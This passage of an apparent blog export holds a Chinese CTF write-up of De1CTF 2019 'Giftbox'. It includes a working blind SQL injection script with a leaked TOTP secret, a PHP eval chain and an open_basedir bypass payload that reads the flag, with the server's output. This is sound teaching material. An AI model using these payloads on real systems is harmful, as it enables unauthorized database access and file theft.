'password' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        result += chr(mid)\n        print(result)\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload,7)\n    print(database)\n\n\n\ndef get_tabls():\n    s_payload = 'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\'giftbox\\''\n    tables=binsea(s_payload,5)\n\ndef get_columns():\n    s_payload = 'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\''\n    columns=binsea(s_payload)\n\n\ndef get_data():\n    s_payload='select/**/concat(password)/**/from/**/users'\n    password=binsea(s_payload)\n\nif __name__ == '__main__':\n    # get_database()\n    # get_tabls()\n    # get_columns()\n    # get_data()\n```\n\n数据库是giftbox,只有一个users表，有`id,username,password`\n\nadmin的密码是`hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}`\n\n根据密码的提示得到\n\n```\n[de1ta@de1ta-mbp /sandbox]% sh0w_hiiintttt_23333\nwe add an evil monster named 'eval' when launching missiles.\n```\n\ntargeting  还有长度限制，code为2，possition为12。\n\n在phpiofo中设置了open_basedir\n\n![](/pic/37.png)\n\n关于open_basedir\n   open_basedir是php.ini中的一个配置选项\n   它可将用户访问文件的活动范围限制在指定的区域，\n   假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。\n   注意用open_basedir指定的限制实际上是前缀,而不是目录名。\n   举例来说: 若\"open_basedir = /dir/user\", 那么目录 \"/dir/user\" 和 \"/dir/user1\"都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。\n\n[绕过参考文章](https://www.cnblogs.com/cimuhuashuimu/p/11544487.html)\n\n绕过payload\n\n```\nchdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));`\n```\n\n附上完整脚本\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 1/14/2020 9:42 PM\nimport pyotp\nimport requests\nimport time\n\nsesssion=requests.session()\nurl = 'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'\ntotp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)\n\ndef get(url, payload):\n    time.sleep(0.5)\n    params = {\n        'a': \"login admin'/**/and/**/(\"+payload+\")# admin\",\n        'totp': totp.now()\n    }\n    # print(params)\n    html = requests.get(url,params=params,).text\n    # print(html)\n    return html\n\n\n\n\ndef binsea(s_payload,len=64):\n    result = ''\n    for x in range(1, len+1):\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n\n            html = get(url, payload)\n            # print(html, '*-*-*-*-*-*', mid)\n            if 'password' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        result += chr(mid)\n        print(result)\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload,7)\n    print(database)\n\n\n\ndef get_tabls():\n    s_payload = 'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\'giftbox\\''\n    tables=binsea(s_payload,5)\n\ndef get_columns():\n    s_payload = 'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\''\n    columns=binsea(s_payload,23)\n\n\ndef get_data():\n    s_payload='select/**/concat(password)/**/from/**/users'\n    password=binsea(s_payload,13)\n\n\ndef login():\n    params = {\n        'a': \"login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}\",\n        'totp': totp.now()\n    }\n    sesssion.get(url, params=params)\n\ndef target(code,position):\n\n    params = {\n        'a': \"targeting\"+code+' '+position,\n        'totp': totp.now()\n    }\n    sesssion.get(url,params=params)\n\ndef destruct():\n    params = {\n        'a': \"destruct\",\n        'totp': totp.now()\n    }\n    sesssion.get(url, params=params)\n\ndef launch():\n    params = {\n        'a': 'launch',\n        'totp': totp.now()\n    }\n    print(sesssion.get(url, params=params).json())\n\n\n\ndef get_password():\n    # get_database()\n    # get_tabls()\n    # get_columns()\n    get_data()\n    \ndef get_flag():\n    login()\n    target('a','chdir')\n    target('b','img')\n    target('c','{$a($b)}')\n\n    target('d','ini_set')\n    target('e', 'open_base_dir')\n    target('f', '..')\n    target('g', '{$d($e,$f)}')\n\n    target('h', '{$a($f)}')\n\n    target('i', '{$a($f)}')\n\n    target('j', '{$a($f)}')\n\n    target('k','{$a($f)}' )\n\n    target('l', '/')\n    target('m', '{$d($e,$l)}')\n\n    target('n', 'eaho')\n    target('o', 'file_get_')\n    target('p', 'contents')\n    target('q', '$o$p')\n    target('r', 'flag')\n    target('s','{$n($q(r))}' )\n    launch()\n\n\nif __name__ == '__main__':\n\tget_flag():\n```\n\n返回结果\n\n```json\n{'code': 0, 'message': 'Initializing launching system...<br>Setting target: $a = \"chdir\";<br>Reading target: $a = \"chdir\";<br>Setting target: $b = \"img\";<br>Reading target: $b = \"img\";<br>Setting target: $c = \"{$a($b)}\";<br>Reading target: $c = \"1\";<br>Setting target: $d = \"ini_set\";<br>Reading target: $d = \"ini_set\";<br>Setting target: $e = \"open_basedir\";<br>Reading target: $e = \"open_basedir\";<br>Setting target: $f = \"..\";<br>Reading target: $f = \"..\";<br>Setting target: $g = \"{$d($e,$f)}\";<br>Reading target: $g = \"/app:/sandbox\";<br>Setting target: $h = \"{$a($f)}\";<br>Reading target: $h = \"1\";<br>Setting target: $i = \"{$a($f)}\";<br>Reading target: $i = \"1\";<br>Setting target: $j = \"Ly8v\";<br>Reading target: $j = \"Ly8v\";<br>Setting target: $k = \"base64_\";<br>Reading target: $k = \"base64_\";<br>Setting target: $l = \"decode\";<br>Reading target: $l = \"decode\";<br>Setting target: $m = \"$k$l\";<br>Reading target: $m = \"base64_decode\";<br>Setting target: $n = \"{$m($j)}\";<br>Reading target: $n = \"///\";<br>Setting target: $o = \"{$d($e,$n)}\";<br>Reading target: $o = \"..\";<br>Setting target: $p = \"flag\";<br>Reading target: $p = \"flag\";<br>Setting target: $q = \"file_get\";<br>Reading target: $q = \"file_get\";<br>Setting target: $r = \"_contents\";<br>Reading target: $r = \"_contents\";<br>Setting target: $s = \"$q$r\";<br>Reading target: $s = \"file_get_contents\";<br>Setting target: $t = \"{$s($p)}\";<br>Reading target: $t = \"flag{dd8dcd47-5bce-4fe2-b2ee-f2aec667ddd3}\\n\";<br>3..2..1..Fire!<br>All 20 missiles are launched...<br>Cruising...<br>Engaging...Bull\\'s-eye!<br>All targets are eliminated.<br>'}\n```\n\n\n\n","source":"_posts/buuoj刷题记录8.md","raw":"---\ntitle: buuoj刷题记录8\ndate: 2020-01-12 12:57:41\ntags:\n - wbe\n - De1CTF\n - sql注入\n - 命令执行\ncategories: \n - 刷题记录\n---\n\n## [De1CTF 2019]Giftbox\n\n### 0x00 基础\n\ntotp:TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。 它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication（OATH）的基石，并被用于许多双因素身份验证系统。TOTP是基于散列的消息认证码（HMAC）的示例。 它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。\n\nSQL盲注\n\nopen_basedir绕过\n\n<!--more-->\n\n\n\n### 0x01 分析\n\n打开网页发现是类似一个linux终端的界面，cd，ls，cat，clear，help，exix，输入help提示可运行下列命令，ls查看后，发现有一个usage.md\n\n```bash\nlogin [username] [password]\nlogout\nlaunch\ntargeting [code] [position]\ndestruct \n```\n\nfuzz后发现要登入，登入抓包的时候发现有一个totp参数\n\n```http\nGET /shell.php?a=login%20admin%20admin&totp=59858608 HTTP/1.1\nHost: 9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: close\nReferer: http://9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn/\nCookie: PHPSESSID=urs1ifeeiqsj6dam5rvs0l50nt\n```\n\n进行login时发现username处存在单引号sql盲注，执行usage中其他操作需要登入\n\n```bash\n[de1ta@de1ta-mbp /sandbox]% login admin' admin\nlogin fail, user not found.\n[de1ta@de1ta-mbp /sandbox]% login admin'# admin\nlogin fail, password incorrect.\n[de1ta@de1ta-mbp /sandbox]% targeting\nlogin first.\n[de1ta@de1ta-mbp /sandbox]% launch\nlogin first.\n```\n\n查看源码，再main.js发现了数据提交过程，和服务器totp设置\n\n```js\n···\n/*\n[Developer Notes]\nOTP Library for Python located in js/pyotp.zip\nServer Params:\ndigits = 8\ninterval = 5\nwindow = 1\n*/\n···\n···\n$.ajax({\n        url: host + '/shell.php?a='+encodeURIComponent(input)+'&totp=' + new TOTP(\"GAXG24JTMZXGKZBU\",8).genOTP(),\n        type: \"GET\",\n        dataType: 'json',\n        success: (res) => {\n            e_main.html($('#main').html() + '[<span id=\"usr\">' + usrName + '</span>@<span class=\"host\">de1ta-mbp</span> ' + position + ']% ' + input + '<br/>' + res.message + '<br/>')\n            if (e_console.height()-$(window).height()>0){e_console.css('top',-(e_console.height()-$(window).height()));}else{e_console.css('top',5);}\n        },\n        error: (res) => {\n            e_main.html($('#main').html() + '[<span id=\"usr\">' + usrName + '</span>@<span class=\"host\">de1ta-mbp</span> ' + position + ']% ' + input + '<br/>System Fatal Error!<br/>')\n            if (e_console.height()-$(window).height()>0){e_console.css('top',-(e_console.height()-$(window).height()));}else{e_console.css('top',5);}\n        }\n      })\n···\n```\n\n### 0x02 操作\n\n编写盲注脚本\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 1/14/2020 9:42 PM\nimport pyotp\nimport requests\nimport time\n\ndef get(url, payload):\n    time.sleep(0.5)\n    totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)\n    params = {\n        'a': \"login admin'/**/and/**/(\"+payload+\")# admin\",\n        'totp': totp.now()\n    }\n    # print(params)\n    html = requests.get(url,params=params,).text\n    # print(html)\n    return html\n\n\n\n\ndef binsea(s_payload,len=64):\n    result = ''\n    for x in range(1, len+1):\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n            url = 'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'\n            html = get(url, payload)\n            # print(html, '*-*-*-*-*-*', mid)\n            if 'password' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        result += chr(mid)\n        print(result)\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload,7)\n    print(database)\n\n\n\ndef get_tabls():\n    s_payload = 'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\'giftbox\\''\n    tables=binsea(s_payload,5)\n\ndef get_columns():\n    s_payload = 'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\''\n    columns=binsea(s_payload)\n\n\ndef get_data():\n    s_payload='select/**/concat(password)/**/from/**/users'\n    password=binsea(s_payload)\n\nif __name__ == '__main__':\n    # get_database()\n    # get_tabls()\n    # get_columns()\n    # get_data()\n```\n\n数据库是giftbox,只有一个users表，有`id,username,password`\n\nadmin的密码是`hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}`\n\n根据密码的提示得到\n\n```\n[de1ta@de1ta-mbp /sandbox]% sh0w_hiiintttt_23333\nwe add an evil monster named 'eval' when launching missiles.\n```\n\ntargeting  还有长度限制，code为2，possition为12。\n\n在phpiofo中设置了open_basedir\n\n![](/pic/37.png)\n\n关于open_basedir\n   open_basedir是php.ini中的一个配置选项\n   它可将用户访问文件的活动范围限制在指定的区域，\n   假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。\n   注意用open_basedir指定的限制实际上是前缀,而不是目录名。\n   举例来说: 若\"open_basedir = /dir/user\", 那么目录 \"/dir/user\" 和 \"/dir/user1\"都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。\n\n[绕过参考文章](https://www.cnblogs.com/cimuhuashuimu/p/11544487.html)\n\n绕过payload\n\n```\nchdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));`\n```\n\n附上完整脚本\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 1/14/2020 9:42 PM\nimport pyotp\nimport requests\nimport time\n\nsesssion=requests.session()\nurl = 'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'\ntotp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)\n\ndef get(url, payload):\n    time.sleep(0.5)\n    params = {\n        'a': \"login admin'/**/and/**/(\"+payload+\")# admin\",\n        'totp': totp.now()\n    }\n    # print(params)\n    html = requests.get(url,params=params,).text\n    # print(html)\n    return html\n\n\n\n\ndef binsea(s_payload,len=64):\n    result = ''\n    for x in range(1, len+1):\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n\n            html = get(url, payload)\n            # print(html, '*-*-*-*-*-*', mid)\n            if 'password' in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        result += chr(mid)\n        print(result)\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload,7)\n    print(database)\n\n\n\ndef get_tabls():\n    s_payload = 'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\'giftbox\\''\n    tables=binsea(s_payload,5)\n\ndef get_columns():\n    s_payload = 'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\''\n    columns=binsea(s_payload,23)\n\n\ndef get_data():\n    s_payload='select/**/concat(password)/**/from/**/users'\n    password=binsea(s_payload,13)\n\n\ndef login():\n    params = {\n        'a': \"login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}\",\n        'totp': totp.now()\n    }\n    sesssion.get(url, params=params)\n\ndef target(code,position):\n\n    params = {\n        'a': \"targeting\"+code+' '+position,\n        'totp': totp.now()\n    }\n    sesssion.get(url,params=params)\n\ndef destruct():\n    params = {\n        'a': \"destruct\",\n        'totp': totp.now()\n    }\n    sesssion.get(url, params=params)\n\ndef launch():\n    params = {\n        'a': 'launch',\n        'totp': totp.now()\n    }\n    print(sesssion.get(url, params=params).json())\n\n\n\ndef get_password():\n    # get_database()\n    # get_tabls()\n    # get_columns()\n    get_data()\n    \ndef get_flag():\n    login()\n    target('a','chdir')\n    target('b','img')\n    target('c','{$a($b)}')\n\n    target('d','ini_set')\n    target('e', 'open_base_dir')\n    target('f', '..')\n    target('g', '{$d($e,$f)}')\n\n    target('h', '{$a($f)}')\n\n    target('i', '{$a($f)}')\n\n    target('j', '{$a($f)}')\n\n    target('k','{$a($f)}' )\n\n    target('l', '/')\n    target('m', '{$d($e,$l)}')\n\n    target('n', 'eaho')\n    target('o', 'file_get_')\n    target('p', 'contents')\n    target('q', '$o$p')\n    target('r', 'flag')\n    target('s','{$n($q(r))}' )\n    launch()\n\n\nif __name__ == '__main__':\n\tget_flag():\n```\n\n返回结果\n\n```json\n{'code': 0, 'message': 'Initializing launching system...<br>Setting target: $a = \"chdir\";<br>Reading target: $a = \"chdir\";<br>Setting target: $b = \"img\";<br>Reading target: $b = \"img\";<br>Setting target: $c = \"{$a($b)}\";<br>Reading target: $c = \"1\";<br>Setting target: $d = \"ini_set\";<br>Reading target: $d = \"ini_set\";<br>Setting target: $e = \"open_basedir\";<br>Reading target: $e = \"open_basedir\";<br>Setting target: $f = \"..\";<br>Reading target: $f = \"..\";<br>Setting target: $g = \"{$d($e,$f)}\";<br>Reading target: $g = \"/app:/sandbox\";<br>Setting target: $h = \"{$a($f)}\";<br>Reading target: $h = \"1\";<br>Setting target: $i = \"{$a($f)}\";<br>Reading target: $i = \"1\";<br>Setting target: $j = \"Ly8v\";<br>Reading target: $j = \"Ly8v\";<br>Setting target: $k = \"base64_\";<br>Reading target: $k = \"base64_\";<br>Setting target: $l = \"decode\";<br>Reading target: $l = \"decode\";<br>Setting target: $m = \"$k$l\";<br>Reading target: $m = \"base64_decode\";<br>Setting target: $n = \"{$m($j)}\";<br>Reading target: $n = \"///\";<br>Setting target: $o = \"{$d($e,$n)}\";<br>Reading target: $o = \"..\";<br>Setting target: $p = \"flag\";<br>Reading target: $p = \"flag\";<br>Setting target: $q = \"file_get\";<br>Reading target: $q = \"file_get\";<br>Setting target: $r = \"_contents\";<br>Reading target: $r = \"_contents\";<br>Setting target: $s = \"$q$r\";<br>Reading target: $s = \"file_get_contents\";<br>Setting target: $t = \"{$s($p)}\";<br>Reading target: $t = \"flag{dd8dcd47-5bce-4fe2-b2ee-f2aec667ddd3}\\n\";<br>3..2..1..Fire!<br>All 20 missiles are launched...<br>Cruising...<br>Engaging...Bull\\'s-eye!<br>All targets are eliminated.<br>'}\n```\n\n\n\n","slug":"buuoj刷题记录8","published":1,"updated":"2020-01-12T04:57:41.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssflw0012pk7e0ush9fwz","content":"<h2 id=\"De1CTF-2019-Giftbox\"><a href=\"#De1CTF-2019-Giftbox\" class=\"headerlink\" title=\"[De1CTF 2019]Giftbox\"></a>[De1CTF 2019]Giftbox</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>totp:TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。 它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication（OATH）的基石，并被用于许多双因素身份验证系统。TOTP是基于散列的消息认证码（HMAC）的示例。 它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。</p>\n<p>SQL盲注</p>\n<p>open_basedir绕过</p>\n<a id=\"more\"></a>\n\n\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>打开网页发现是类似一个linux终端的界面，cd，ls，cat，clear，help，exix，输入help提示可运行下列命令，ls查看后，发现有一个usage.md</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">login [username] [password]</span><br><span class=\"line\"><span class=\"built_in\">logout</span></span><br><span class=\"line\">launch</span><br><span class=\"line\">targeting [code] [position]</span><br><span class=\"line\">destruct</span><br></pre></td></tr></table></figure>\n\n<p>fuzz后发现要登入，登入抓包的时候发现有一个totp参数</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/shell.php?a=login%20admin%20admin&amp;totp=59858608</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: application/json, text/javascript, */*; q=0.01</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">X-Requested-With</span>: XMLHttpRequest</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Referer</span>: http://9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn/</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: PHPSESSID=urs1ifeeiqsj6dam5rvs0l50nt</span><br></pre></td></tr></table></figure>\n\n<p>进行login时发现username处存在单引号sql盲注，执行usage中其他操作需要登入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[de1ta@de1ta-mbp /sandbox]% login admin<span class=\"string\">' admin</span></span><br><span class=\"line\"><span class=\"string\">login fail, user not found.</span></span><br><span class=\"line\"><span class=\"string\">[de1ta@de1ta-mbp /sandbox]% login admin'</span><span class=\"comment\"># admin</span></span><br><span class=\"line\">login fail, password incorrect.</span><br><span class=\"line\">[de1ta@de1ta-mbp /sandbox]% targeting</span><br><span class=\"line\">login first.</span><br><span class=\"line\">[de1ta@de1ta-mbp /sandbox]% launch</span><br><span class=\"line\">login first.</span><br></pre></td></tr></table></figure>\n\n<p>查看源码，再main.js发现了数据提交过程，和服务器totp设置</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">···</span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">[Developer Notes]</span></span><br><span class=\"line\"><span class=\"comment\">OTP Library for Python located in js/pyotp.zip</span></span><br><span class=\"line\"><span class=\"comment\">Server Params:</span></span><br><span class=\"line\"><span class=\"comment\">digits = 8</span></span><br><span class=\"line\"><span class=\"comment\">interval = 5</span></span><br><span class=\"line\"><span class=\"comment\">window = 1</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">···</span><br><span class=\"line\">···</span><br><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">        url: host + <span class=\"string\">'/shell.php?a='</span>+<span class=\"built_in\">encodeURIComponent</span>(input)+<span class=\"string\">'&amp;totp='</span> + <span class=\"keyword\">new</span> TOTP(<span class=\"string\">\"GAXG24JTMZXGKZBU\"</span>,<span class=\"number\">8</span>).genOTP(),</span><br><span class=\"line\">        type: <span class=\"string\">\"GET\"</span>,</span><br><span class=\"line\">        dataType: <span class=\"string\">'json'</span>,</span><br><span class=\"line\">        success: <span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">            e_main.html($(<span class=\"string\">'#main'</span>).html() + <span class=\"string\">'[&lt;span id=\"usr\"&gt;'</span> + usrName + <span class=\"string\">'&lt;/span&gt;@&lt;span class=\"host\"&gt;de1ta-mbp&lt;/span&gt; '</span> + position + <span class=\"string\">']% '</span> + input + <span class=\"string\">'&lt;br/&gt;'</span> + res.message + <span class=\"string\">'&lt;br/&gt;'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (e_console.height()-$(<span class=\"built_in\">window</span>).height()&gt;<span class=\"number\">0</span>)&#123;e_console.css(<span class=\"string\">'top'</span>,-(e_console.height()-$(<span class=\"built_in\">window</span>).height()));&#125;<span class=\"keyword\">else</span>&#123;e_console.css(<span class=\"string\">'top'</span>,<span class=\"number\">5</span>);&#125;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        error: <span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">            e_main.html($(<span class=\"string\">'#main'</span>).html() + <span class=\"string\">'[&lt;span id=\"usr\"&gt;'</span> + usrName + <span class=\"string\">'&lt;/span&gt;@&lt;span class=\"host\"&gt;de1ta-mbp&lt;/span&gt; '</span> + position + <span class=\"string\">']% '</span> + input + <span class=\"string\">'&lt;br/&gt;System Fatal Error!&lt;br/&gt;'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (e_console.height()-$(<span class=\"built_in\">window</span>).height()&gt;<span class=\"number\">0</span>)&#123;e_console.css(<span class=\"string\">'top'</span>,-(e_console.height()-$(<span class=\"built_in\">window</span>).height()));&#125;<span class=\"keyword\">else</span>&#123;e_console.css(<span class=\"string\">'top'</span>,<span class=\"number\">5</span>);&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">···</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"0x02-操作\"><a href=\"#0x02-操作\" class=\"headerlink\" title=\"0x02 操作\"></a>0x02 操作</h3><p>编写盲注脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 1/14/2020 9:42 PM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> pyotp</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    time.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">    totp = pyotp.TOTP(<span class=\"string\">'GAXG24JTMZXGKZBU'</span>, <span class=\"number\">8</span>, interval=<span class=\"number\">5</span>)</span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">'a'</span>: <span class=\"string\">\"login admin'/**/and/**/(\"</span>+payload+<span class=\"string\">\")# admin\"</span>,</span><br><span class=\"line\">        <span class=\"string\">'totp'</span>: totp.now()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\"># print(params)</span></span><br><span class=\"line\">    html = requests.get(url,params=params,).text</span><br><span class=\"line\">    <span class=\"comment\"># print(html)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span 